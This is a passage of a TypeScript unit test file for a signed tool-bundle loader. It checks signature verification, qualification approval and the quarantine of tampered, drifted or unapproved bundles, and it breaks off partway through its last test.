import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  CURRENT_QUALIFICATION_VERSION,
  type FrozenToolIntent,
  type IndependentReplayRecord,
  type ObservedEffectProfile,
  type QualificationArtifactBundle,
  type QualificationRunRecord,
  type ToolManifest,
  ToolManifestSchema,
  type ToolQualificationApproval,
  canonicalJson,
  computeApprovalDigest,
  computeApprovalSigningPayload,
  computeFrozenIntentDigest,
  computeIndependentReplayDigest,
  computeObservedEffectProfileDigest,
  computeQualificationBundleDigest,
  computeQualificationRunDigest,
  computeRawEvidenceDigest,
  computeReviewerVerdictDigest,
} from "@resin/contracts";
import { describe, expect, it } from "vitest";
import {
  buildToolBundle,
  computeSha256,
  encodeDeterministicTar,
  parseTarArchive,
} from "../src/bundle/builder.js";
import { InMemoryKeyStore, generateBundleKeyPair } from "../src/bundle/signature.js";
import { ArtifactCache } from "../src/loader/cache.js";
import {
  BundleSignatureError,
  BundleValidationError,
  ToolBundleLoader,
} from "../src/loader/loader.js";
import { QuarantineManager } from "../src/loader/quarantine.js";
import { BundleSecurityError } from "../src/loader/security-checks.js";
import {
  TOKEN_BRAND,
  getVerifiedQualificationData,
  isVerifiedQualificationToken,
} from "../src/monitor/token.js";

const validManifest: ToolManifest = {
  id: "test-tool-loader",
  name: "loader_test_tool",
  version: "1.0.0",
  description: "Test tool for tool bundle loader verification",
  entrypoint: "src/index.ts",
  parameters: {
    type: "object",
    properties: {
      query: { type: "string" },
    },
    required: ["query"],
  },
  runtime: {
    runtime: "deno",
    memoryLimitMb: 128,
    timeoutMs: 10000,
    cpuLimitPercent: 100,
    maxOutputSizeBytes: 1048576,
  },
  capabilities: {
    version: "1.0.0",
    description: "Loader test tool capabilities",
    fs: { read: ["."], write: [] },
    net: { allowedHosts: [], allowDns: false },
    exec: { allowedCommands: [], allowPipes: false },
    harness: { allowRegistration: false, allowTelemetry: false },
  },
  limits: {
    timeoutMs: 10000,
    maxOutputBytes: 1048576,
    maxMemoryBytes: 134217728,
    maxConcurrentInvocations: 2,
  },
  scope: "workspace",
  digest: "sha256:0000000000000000000000000000000000000000000000000000000000000000",
  metadata: {},
  createdAt: "2026-08-20T00:00:00.000Z",
};

function createTestQualificationBundle(
  sourceCode: string,
  keyPair: { keyId: string; privateKeyPem: string; publicKeyPem: string },
  customizer?: (bundle: Omit<QualificationArtifactBundle, "approval">) => void,
  options?: {
    dependencies?: Record<string, string>;
    consequentialActions?: Array<{
      actionType: string;
      target: string;
      description: string;
      requiresExplicitAuthorization?: boolean;
    }>;
    depDigest?: string;
    schemaDigest?: string;
    candidateId?: string;
    manifest?: ToolManifest;
    toolId?: string;
    toolVersion?: string;
  },
): QualificationArtifactBundle {
  const sourceDigest = computeSha256(sourceCode);
  const depDigest = options?.depDigest ?? computeSha256(canonicalJson(options?.dependencies ?? {}));
  const parsedManifest = ToolManifestSchema.parse(options?.manifest ?? validManifest);
  const schemaDigest =
    options?.schemaDigest ?? computeSha256(canonicalJson(parsedManifest.parameters));
  const rawIntent: Omit<FrozenToolIntent, "intentDigest"> = {
    intentId: "intent-001",
    schemaVersion: CURRENT_QUALIFICATION_VERSION,
    goal: "Implement deterministic test tool",
    successCriteria: ["Must pass test criteria"],
    inputSchemaDigest: schemaDigest,
    constraints: ["No network access", "No subprocess execution"],
    createdAt: "2026-08-20T10:00:00.000Z",
    createdBy: "generator-agent-01",
  };
  const intentDigest = computeFrozenIntentDigest(rawIntent);
  const frozenIntent: FrozenToolIntent = {
    ...rawIntent,
    intentDigest,
  };

  const effectProfile: ObservedEffectProfile = {
    filesRead: { observation: "complete", paths: ["src/index.ts"] },
    filesCreated: { observation: "complete", paths: [] },
    filesModified: { observation: "complete", paths: [] },
    filesDeleted: { observation: "complete", paths: [] },
    processTree: { observation: "complete", spawnedProcesses: [] },
    network: { observation: "complete", destinations: [], methods: [] },
    environmentVariables: { observation: "complete", names: [] },
    credentials: { observation: "complete", names: [] },
    dependencyChanges: { observation: "complete", changes: [] },
    artifacts: { observation: "complete", items: [] },
    validationChecks: {
      observation: "complete",
      checks: [{ checkId: "chk-1", name: "unit-tests", passed: true }],
    },
    resourceEnvelope: {
      observation: "complete",
      maxMemoryBytes: 1024 * 1024,
      cpuTimeMs: 50,
      wallDurationMs: 100,
    },
    consequentialActions: {
      observation: "complete",
      actions: options?.consequentialActions ?? [],
    },
    determinism: "deterministic",
  };
  const profileDigest = computeObservedEffectProfileDigest(effectProfile);
  const validEffectProfile: ObservedEffectProfile = {
    ...effectProfile,
    profileDigest,
  };

  const run0Raw: Omit<QualificationRunRecord, "recordDigest"> = {
    runId: "run-001",
    sequence: 0,
    candidateId: "cand-001",
    environment: "env-linux-arm64",
    status: "passed",
    sourceDigest,
    dependencyDigest: depDigest,
    intentDigest,
    environmentDigest: "c1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
    inputDigest: "d1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
    traceDigest: "e1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
    beforeStateDigest: "f1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
    afterStateDigest: "f2b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
    outputDigest: "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
    checkDigest: "a2b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
    effectDigest: profileDigest,
    observedEffectProfile: validEffectProfile,
    structuredChecks: [
      { checkId: "chk-1", name: "unit-tests", status: "passed", message: "All passed" },
    ],
    costs: {
      modelUsageObservation: "complete",
      inputTokens: 1000,
      outputTokens: 500,
      cacheReadTokens: 0,
      costUsd: 0.005,
    },
    previousRecordDigest: null,
    startedAt: "2026-08-20T10:01:00.000Z",
    completedAt: "2026-08-20T10:01:02.000Z",
  };
  const run0Digest = computeQualificationRunDigest(run0Raw);
  const run0: QualificationRunRecord = { ...run0Raw, recordDigest: run0Digest };

  const run1Raw: Omit<QualificationRunRecord, "recordDigest"> = {
    ...run0Raw,
    runId: "run-002",
    sequence: 1,
    environment: "env-linux-x64",
    previousRecordDigest: run0Digest,
    startedAt: "2026-08-20T10:01:05.000Z",
    completedAt: "2026-08-20T10:01:07.000Z",
  };
  const run1Digest = computeQualificationRunDigest(run1Raw);
  const run1: QualificationRunRecord = { ...run1Raw, recordDigest: run1Digest };

  const runs = [run0, run1];
  const rawEvidenceDigest = computeRawEvidenceDigest({
    schemaVersion: CURRENT_QUALIFICATION_VERSION,
    candidateId: "cand-001",
    frozenIntent,
    runs,
  });

  const verdict0Raw: Omit<ReviewerVerdict, "recordDigest"> = {
    verdictId: "verdict-001",
    sequence: 0,
    sessionId: "session-001",
    reviewerId: "reviewer-security",
    reviewerRole: "correctness-usefulness",
    verdict: "approved",
    noGeneratorHistory: true,
    sourceDigest,
    dependencyDigest: depDigest,
    intentDigest,
    rawEvidenceDigest,
    findings: [],
    comments: "Correctness verified",
    previousRecordDigest: null,
    reviewedAt: "2026-08-20T10:05:00.000Z",
  };
  const verdict0Digest = computeReviewerVerdictDigest(verdict0Raw);
  const verdict0: ReviewerVerdict = {
    ...verdict0Raw,
    recordDigest: verdict0Digest,
  };

  const verdict1Raw: Omit<ReviewerVerdict, "recordDigest"> = {
    verdictId: "verdict-002",
    sequence: 1,
    sessionId: "session-002",
    reviewerId: "reviewer-code",
    reviewerRole: "adversarial-safety",
    verdict: "approved",
    noGeneratorHistory: true,
    sourceDigest,
    dependencyDigest: depDigest,
    intentDigest,
    rawEvidenceDigest,
    findings: [],
    comments: "Safety verified",
    previousRecordDigest: verdict0Digest,
    reviewedAt: "2026-08-20T10:06:00.000Z",
  };
  const verdict1Digest = computeReviewerVerdictDigest(verdict1Raw);
  const verdict1: ReviewerVerdict = {
    ...verdict1Raw,
    recordDigest: verdict1Digest,
  };

  const replayRaw: Omit<IndependentReplayRecord, "recordDigest"> = {
    replayId: "replay-001",
    candidateId: "cand-001",
    targetRunId: "run-001",
    replayEnvironment: "env-replay-isolated",
    status: "passed",
    sourceDigest,
    dependencyDigest: depDigest,
    intentDigest,
    rawEvidenceDigest,
    outputDigest: run0.outputDigest,
    checkDigest: run0.checkDigest,
    durationMs: 1200,
    completedAt: "2026-08-20T10:07:00.000Z",
  };
  const replay: IndependentReplayRecord = {
    ...replayRaw,
    recordDigest: computeIndependentReplayDigest(replayRaw),
  };
  const unsignedBundle: Omit<QualificationArtifactBundle, "approval"> = {
    bundleId: "bundle-001",
    schemaVersion: CURRENT_QUALIFICATION_VERSION,
    candidateId: options?.candidateId ?? "cand-001",
    previousBundleDigest: null,
    frozenIntent,
    rawEvidenceDigest,
    runs,
    reviewers: [verdict0, verdict1],
    replay,
    createdAt: "2026-08-20T10:08:00.000Z",
    metadata: {
      ...(options?.toolId ? { toolId: options.toolId } : {}),
      ...(options?.toolVersion ? { toolVersion: options.toolVersion } : {}),
    },
  };

  if (customizer) {
    customizer(unsignedBundle);
  }

  const artifactBundleDigest = computeQualificationBundleDigest(unsignedBundle);

  const approvalRaw: Omit<ToolQualificationApproval, "approvalDigest" | "signature"> = {
    approvalId: "approval-001",
    approverId: "qualification-authority-admin",
    decision: "approved",
    sourceDigest,
    dependencyDigest: depDigest,
    intentDigest,
    rawEvidenceDigest,
    artifactBundleDigest,
    signedAt: "2026-08-20T10:09:00.000Z",
    comments: "Bundle approved for staging and production deployment",
  };
  const approvalDigest = computeApprovalDigest(approvalRaw);

  const signingPayload = computeApprovalSigningPayload(artifactBundleDigest, approvalDigest);
  const signatureBytes = crypto.sign(
    null,
    Buffer.from(signingPayload, "utf8"),
    keyPair.privateKeyPem,
  );
  const signature = {
    keyId: keyPair.keyId,
    algorithm: "ed25519" as const,
    signature: signatureBytes.toString("base64"),
    signedDigest: artifactBundleDigest,
  };

  const approval: ToolQualificationApproval = {
    ...approvalRaw,
    approvalDigest,
    signature,
  };

  return {
    ...unsignedBundle,
    approval,
  };
}

describe("tool bundle loader", () => {
  it("safely extracts, validates, and stages a valid tool bundle in development mode", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const keyPair = generateBundleKeyPair("ed25519", "test-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: keyPair.keyId,
          algorithm: keyPair.algorithm,
          publicKeyPem: keyPair.publicKeyPem,
          trustLevel: "development",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({
        cache,
        quarantine,
        keyStore,
        allowDevKeys: true,
        development: true,
      });

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: "export const handler = () => 'hello';" }],
        signOptions: {
          keyId: keyPair.keyId,
          privateKeyPem: keyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      const loaded = await loader.loadBundle(built.archiveBuffer, {
        allowDevKeys: true,
        development: true,
      });
      expect(loaded).toBeDefined();
      expect(loaded.digest).toBe(built.bundleDigest);
      expect(loaded.isCached).toBe(false);
      expect(loaded.isApproved).toBe(false);
      expect(loaded.approval).toBeUndefined();
      expect(loaded.qualificationToken).toBeUndefined();
      expect(isVerifiedQualificationToken(loaded)).toBe(false);
      expect(fs.existsSync(loaded.entrypointPath)).toBe(true);

      // Verify cached load
      const cachedLoad = await loader.loadBundle(built.archiveBuffer, {
        allowDevKeys: true,
        development: true,
      });
      expect(cachedLoad.isCached).toBe(true);
      expect(cachedLoad.digest).toBe(built.bundleDigest);
      expect(cachedLoad.isApproved).toBe(false);
      expect(cachedLoad.qualificationToken).toBeUndefined();
      expect(isVerifiedQualificationToken(cachedLoad)).toBe(false);
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("successfully loads an exact signed production qualification bundle and exposes immutable approval + effect profile", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-prod-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const execute = () => 'qualified-output';";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Production load without dev flags
      const loaded = await loader.loadBundle(built.archiveBuffer);
      expect(loaded).toBeDefined();
      expect(loaded.digest).toBe(built.bundleDigest);
      expect(loaded.isApproved).toBe(true);
      expect(loaded.approval).toBeDefined();
      expect(loaded.approval?.decision).toBe("approved");
      expect(loaded.effectProfile).toBeDefined();
      expect(loaded.effectProfile?.filesRead.observation).toBe("complete");
      expect(loaded.qualificationToken?.[TOKEN_BRAND]).toBe(true);
      expect(isVerifiedQualificationToken(loaded.qualificationToken)).toBe(true);
      expect(isVerifiedQualificationToken(loaded)).toBe(true);
      const vData = getVerifiedQualificationData(loaded.qualificationToken);
      expect(vData).toBeDefined();
      expect(vData?.toolId).toBe(validManifest.id);
      expect(vData?.toolVersion).toBe(validManifest.version);
      expect(vData?.sourceDigest).toBe(qualificationBundle.approval.sourceDigest);
      expect(vData?.depDigest).toBe(qualificationBundle.approval.dependencyDigest);
      expect(vData?.schemaDigest).toBe(qualificationBundle.frozenIntent.inputSchemaDigest);
      expect(vData?.intentDigest).toBe(qualificationBundle.frozenIntent.intentDigest);
      expect(vData?.approval.decision).toBe("approved");
      expect(vData?.runs).toEqual(qualificationBundle.runs);
      expect(() => {
        (loaded.approval as unknown as Record<string, unknown>).decision = "rejected";
      }).toThrow();

      // Verify cached load retains approval and effect profile
      const cachedLoad = await loader.loadBundle(built.archiveBuffer);
      expect(cachedLoad.isCached).toBe(true);
      expect(cachedLoad.isApproved).toBe(true);
      expect(cachedLoad.approval?.decision).toBe("approved");
      expect(Object.isFrozen(cachedLoad.approval)).toBe(true);
      expect(cachedLoad.qualificationToken).toBeDefined();
      expect(isVerifiedQualificationToken(cachedLoad.qualificationToken)).toBe(true);
      expect(isVerifiedQualificationToken(cachedLoad)).toBe(true);
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects and quarantines non-development load when qualification.json is missing with unapproved_candidate", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-no-qual-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      // Build bundle WITHOUT qualification.json
      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: "export const x = 1;" }],
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Default (non-development) load MUST reject
      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrowError(
        BundleValidationError,
      );

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(quarantined[0]?.reason).toBe("unapproved_candidate");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("loads development-only bundle under explicit development option without approval mark", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-dev-opt-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const devKeyPair = generateBundleKeyPair("ed25519", "dev-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: devKeyPair.keyId,
          algorithm: devKeyPair.algorithm,
          publicKeyPem: devKeyPair.publicKeyPem,
          trustLevel: "development",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: "export const dev = true;" }],
      });

      // Explicit development option allows loading for test / development
      const loaded = await loader.loadBundle(built.archiveBuffer, { development: true });
      expect(loaded).toBeDefined();
      expect(loaded.isApproved).toBe(false);
      expect(loaded.approval).toBeUndefined();
      expect(loaded.effectProfile).toBeUndefined();
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects and quarantines bundle signed by untrusted/dev key on production load", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-wrong-key-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const devKeyPair = generateBundleKeyPair("ed25519", "dev-key-01");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-01");

      const keyStore = new InMemoryKeyStore([
        {
          keyId: devKeyPair.keyId,
          algorithm: devKeyPair.algorithm,
          publicKeyPem: devKeyPair.publicKeyPem,
          trustLevel: "development",
          createdAt: new Date().toISOString(),
        },
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const x = 123;";
      // Signed with development key, not production key
      const qualificationBundle = createTestQualificationBundle(sourceCode, devKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: devKeyPair.keyId,
          privateKeyPem: devKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });
      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrow();

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(["unapproved_candidate", "signature_mismatch"]).toContain(quarantined[0]?.reason);
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects and quarantines bundle on tampered signature with signature_mismatch", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-tampered-sig-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });
      const sourceCode = "export const x = 123;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);
      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Tamper signature.json
      const entries = parseTarArchive(built.archiveBuffer);
      const sigEntry = entries.find((e) => e.path === "signature.json");
      if (sigEntry) {
        const sigObj = JSON.parse(sigEntry.content.toString("utf8"));
        sigObj.signature = "00".repeat(64);
        sigEntry.content = Buffer.from(JSON.stringify(sigObj), "utf8");
      }
      const { archive: tamperedArchive } = encodeDeterministicTar(entries);

      await expect(loader.loadBundle(tamperedArchive)).rejects.toThrow();
      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects and quarantines on source code modification after qualification with approval_drift", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-drift-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const originalCode = "export const orig = 1;";
      const modifiedCode = "export const modified = 2;";
      const qualificationBundle = createTestQualificationBundle(originalCode, prodKeyPair);

      // Bundle packaged with modified code differing from qualified sourceDigest
      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: modifiedCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });
      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrowError(
        BundleValidationError,
      );

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(quarantined[0]?.reason).toBe("approval_drift");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects and quarantines on qualification digest mismatch with approval_drift", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-digest-drift-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const check = true;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);
      qualificationBundle.frozenIntent.goal = "Modified goal without updating intentDigest";

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrowError(
        BundleValidationError,
      );

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(quarantined[0]?.reason).toBe("approval_drift");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects and quarantines unapproved candidate (decision: rejected) with unapproved_candidate", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-rejected-candidate-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const unapproved = true;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);
      qualificationBundle.approval.decision = "rejected";
      qualificationBundle.approval.approvalDigest = computeApprovalDigest(
        qualificationBundle.approval,
      );
      const signingPayload = computeApprovalSigningPayload(
        qualificationBundle.approval.artifactBundleDigest,
        qualificationBundle.approval.approvalDigest,
      );
      qualificationBundle.approval.signature.signature = crypto
        .sign(null, Buffer.from(signingPayload, "utf8"), prodKeyPair.privateKeyPem)
        .toString("base64");

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrowError(
        BundleValidationError,
      );

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(quarantined[0]?.reason).toBe("unapproved_candidate");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("invalidates cache and fails when cached files are modified after initial qualification load", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-cache-drift-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });
      const sourceCode = "export const orig = 1;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Initial load: successfully extracted and cached
      const loaded = await loader.loadBundle(built.archiveBuffer);
      expect(loaded.isApproved).toBe(true);

      // Tamper with cached file directly on disk
      const cachedEntrypoint = path.join(loaded.artifactDir, "src/index.ts");
      fs.writeFileSync(cachedEntrypoint, "export const tampered = 2;");

      // Next load must detect source mismatch, invalidate cache, and throw
      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrow();
      expect(cache.hasArtifact(built.bundleDigest)).toBe(false);
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("quarantines payload and throws error on digest mismatch", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-mismatch-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const keyPair = generateBundleKeyPair("ed25519", "test-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: keyPair.keyId,
          algorithm: keyPair.algorithm,
          publicKeyPem: keyPair.publicKeyPem,
          trustLevel: "development",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: "export const x = 1;" }],
        signOptions: {
          keyId: keyPair.keyId,
          privateKeyPem: keyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      const wrongDigest = "0000000000000000000000000000000000000000000000000000000000000000";

      await expect(
        loader.loadBundle(built.archiveBuffer, {
          expectedDigest: wrongDigest,
          development: true,
        }),
      ).rejects.toThrowError(BundleSecurityError);

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(quarantined[0]?.reason).toBe("digest_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("quarantines and rejects bundle with missing entrypoint or invalid manifest", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-invalid-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const keyPair = generateBundleKeyPair("ed25519", "test-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: keyPair.keyId,
          algorithm: keyPair.algorithm,
          publicKeyPem: keyPair.publicKeyPem,
          trustLevel: "development",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
